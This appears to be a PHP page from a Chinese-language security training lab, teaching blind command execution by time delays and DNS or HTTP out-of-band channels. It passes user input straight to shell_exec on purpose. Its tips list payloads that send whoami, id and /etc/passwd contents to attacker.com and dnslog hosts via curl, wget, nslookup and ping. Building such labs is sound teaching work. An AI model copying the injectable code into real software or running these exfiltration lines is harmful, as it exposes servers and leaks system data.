<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot high"></span>
        <span class="badge badge-hard">困难</span>
        <h2 style="margin:0">👁️ 无回显RCE</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>当命令执行后没有回显时，如何获取执行结果？
        利用时间盲注、外带数据等高级技术。本模块模拟无回显场景，通过辅助机制验证命令是否执行成功。
    </div>

    <div class="difficulty-selector">
        <span style="font-weight:600;margin-right:8px;">选择利用方式：</span>
        <button class="diff-btn active" data-mode="time" onclick="setMode('time')">⏱️ 时间盲注</button>
        <button class="diff-btn" data-mode="dns" onclick="setMode('dns')">🌐 DNS外带</button>
        <button class="diff-btn" data-mode="http" onclick="setMode('http')">📡 HTTP外带</button>
    </div>

    <form method="POST">
        <input type="hidden" name="mode" id="modeInput" value="time">
        <div class="form-group">
            <label for="blind_input">输入 Payload：</label>
            <div class="form-row">
                <input type="text" name="blind_input" id="blind_input" 
                       placeholder="输入命令..."
                       value="<?php echo htmlspecialchars($_POST['blind_input'] ?? 'whoami'); ?>">
                <button type="submit" name="blind_submit" class="submit-btn">执行 ▶</button>
            </div>
        </div>
    </form>

    <?php
    if (isset($_POST['blind_submit']) && !empty($_POST['blind_input'])) {
        $cmd = $_POST['blind_input'];
        $mode = $_POST['mode'] ?? 'time';

        echo '<div class="alert alert-danger">';
        echo '<strong>🔇 无回显模式：</strong>命令已执行，但输出被丢弃，无法直接看到结果！';
        echo '</div>';

        echo '<div class="output-section">';
        echo '<h4>执行信息：</h4>';
        echo '<div class="output-box">';

        switch ($mode) {
            case 'time':
                $start = microtime(true);
                // 模拟无回显执行
                shell_exec($cmd . ' > /dev/null 2>&1 &');
                $elapsed = (microtime(true) - $start) * 1000;
                echo '<span class="info">// 命令已执行（输出被重定向到 /dev/null）</span>' . "\n";
                echo '<span class="info">// 执行耗时: ' . round($elapsed, 2) . 'ms</span>' . "\n";
                echo '<span class="info">// 提示：尝试使用 sleep 进行时间盲注判断</span>' . "\n";
                echo '<span class="info">// 例如: whoami; sleep 5</span>' . "\n";
                break;

            case 'dns':
                echo '<span class="info">// 模拟 DNS 外带数据</span>' . "\n";
                echo '<span class="info">// 实际攻击中，将数据拼接到DNS请求中发送到攻击者服务器</span>' . "\n";
                echo "\n";
                echo '<span class="success">📤 外带数据示例：</span>' . "\n";
                echo "curl http://[your-dnslog-domain]/" . htmlspecialchars($cmd) . "\n";
                echo "ping -c 1 \$(whoami).[your-dnslog-domain]\n";
                break;

            case 'http':
                echo '<span class="info">// 模拟 HTTP 外带数据</span>' . "\n";
                echo '<span class="info">// 实际攻击中，将数据通过HTTP请求发送到攻击者服务器</span>' . "\n";
                echo "\n";
                echo '<span class="success">📤 外带数据示例：</span>' . "\n";
                echo "curl http://[your-server]/collect?data=\$(whoami)\n";
                echo "wget --post-data=\"data=\$(whoami)\" http://[your-server]/collect\n";
                break;
        }

        echo '</div>';

        // 显示无回显下的检测方法
        echo '<div class="status-bar">';
        echo '<span><span class="label">模式:</span> ' . htmlspecialchars($mode) . '</span>';
        echo '<span><span class="label">命令:</span> <code>' . htmlspecialchars($cmd) . '</code></span>';
        echo '</div>';
        echo '</div>';

        // 时间盲注检测演示
        if ($mode === 'time') {
            echo '<div class="panel" style="margin-top:1rem;">';
            echo '<h4>⏱️ 时间盲注检测演示</h4>';
            echo '<p>在无回显时，通过 <code>sleep()</code> 判断命令是否执行成功：</p>';
            
            $test_cmds = [
                '正常命令' => ['cmd' => 'echo "rce_test"; sleep 3', 'sleep' => 3],
                '错误命令（快速返回）' => ['cmd' => 'nonexistent_command', 'sleep' => 0],
            ];

            foreach ($test_cmds as $label => $test) {
                $start_t = microtime(true);
                shell_exec($test['cmd'] . ' > /dev/null 2>&1 &');
                // 实际上不等待，只是演示
                echo '<div class="alert alert-info">';
                echo '<strong>' . htmlspecialchars($label) . '：</strong><br>';
                echo 'Payload: <code>' . htmlspecialchars($test['cmd']) . '</code><br>';
                echo '预期延迟: ' . $test['sleep'] . '秒（如果命令成功执行）';
                echo '</div>';
            }
            echo '</div>';
        }

        // DNS外带参考
        if ($mode === 'dns') {
            echo '<div class="panel" style="margin-top:1rem;">';
            echo '<h4>🌐 DNS外带参考</h4>';
            echo '<p>常用 DNSLog 平台：</p>';
            echo '<ul>';
            echo '<li><code>http://dnslog.cn</code></li>';
            echo '<li><code>http://ceye.io</code></li>';
            echo '<li><code>http://dnslog.link</code></li>';
            echo '<li>Burp Suite Collaborator</li>';
            echo '</ul>';
            echo '<p><strong>检测命令：</strong></p>';
            echo '<ul class="payload-list">';
            echo '<li><code>curl http://xxx.dnslog.cn/$(whoami)</code></li>';
            echo '<li><code>ping -c 1 $(whoami).xxx.dnslog.cn</code></li>';
            echo '</ul>';
            echo '</div>';
        }
    }
    ?>

    <div class="tip-collapse">
        <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
            📚 无回显RCE原理
        </div>
        <div class="tip-content">
            <h4>为什么会有无回显？</h4>
            <ul>
                <li>服务端使用了 <code>exec()</code> 但没有输出结果</li>
                <li>输出被重定向或丢弃</li>
                <li>命令在子进程中执行，无法捕获输出</li>
                <li>防火墙屏蔽了出站流量</li>
            </ul>

            <h4>三种利用方式</h4>
            <div class="source-code"><pre><span class="php">// 1. 时间盲注 - 通过sleep判断
if (condition) { sleep(5); }

// 2. DNS外带 - 通过DNS请求外带数据
curl http://attacker.com/$(whoami)

// 3. HTTP外带 - 通过HTTP请求外带
curl -X POST -d "data=$(cat /etc/passwd)" http://attacker.com/</span></pre></div>
        </div>
    </div>

    <div class="tip-collapse">
        <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
            🎯 常用盲注Payload
        </div>
        <div class="tip-content">
            <h4>时间盲注：</h4>
            <ul class="payload-list">
                <li><code>whoami; sleep 5</code> - 基本延时</li>
                <li><code>if [ $(whoami | cut -c1) == "r" ]; then sleep 10; fi</code> - 逐字符猜解</li>
                <li><code>if [ -f /etc/passwd ]; then sleep 5; fi</code> - 判断文件存在</li>
            </ul>

            <h4>DNS外带：</h4>
            <ul class="payload-list">
                <li><code>nslookup $(whoami).attacker.com</code></li>
                <li><code>dig $(whoami).attacker.com</code></li>
                <li><code>ping -c 1 $(id | base64 -w0).attacker.com</code></li>
            </ul>

            <h4>HTTP外带：</h4>
            <ul class="payload-list">
                <li><code>curl http://attacker.com/$(whoami)</code></li>
                <li><code>wget --post-data="u=$(whoami)" http://attacker.com/</code></li>
                <li><code>curl -d @/etc/passwd http://attacker.com/</code></li>
            </ul>
        </div>
    </div>
</div>

<script>
function setMode(mode) {
    document.getElementById('modeInput').value = mode;
    document.getElementById('blind_input').focus();
    
    const btns = document.querySelectorAll('.diff-btn');
    btns.forEach(b => b.classList.remove('active'));
    document.querySelector(`.diff-btn[data-mode="${mode}"]`).classList.add('active');
}
</script>
